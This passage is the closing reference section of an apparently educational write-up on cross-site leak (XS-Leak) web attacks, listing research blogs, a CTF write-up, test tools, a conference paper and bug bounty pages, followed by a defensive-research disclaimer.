- [Cross-Site ETag Length Leak](https://blog.arkark.dev/2025/12/26/etag-length-leak) (XS-Spin Blog, 2025)
- [Multiple Cross-Site Leaks Disclosing Facebook Users](https://ysamm.com/uncategorized/2026/01/16/cross-site-leaks.html) (Youssef Sammouda, 2024-2025)
- [Top 10 Web Hacking Techniques of 2025](https://portswigger.net/research/top-10-web-hacking-techniques-of-2025) (PortSwigger)
- [December CTF Challenge: Chaining XS Leaks and postMessage XSS](https://www.intigriti.com/researchers/blog/hacking-tools/december-ctf-challenge-xs-leaks-postmessage-xss) (Intigriti, 2024)

### Tools
- [XSinator Browser Test Suite](https://xsinator.com/)
- [Scripted Henchmen: Leveraging XS-Leaks for Vulnerability Detection](https://wootconference.org/papers/woot23-paper23.pdf) (WOOT 2023)

### Bug Bounty Programs
- [Meta Bug Bounty: Cross-site leaks Payout Guidelines](https://bugbounty.meta.com/payout-guidelines/xsleak/)
- [HackerOne: Imgur De-anonymization Attack #723175](https://hackerone.com/reports/723175)

---

*This document was created for defensive security research and vulnerability understanding purposes. All techniques described are documented for educational use and improving web platform security.*
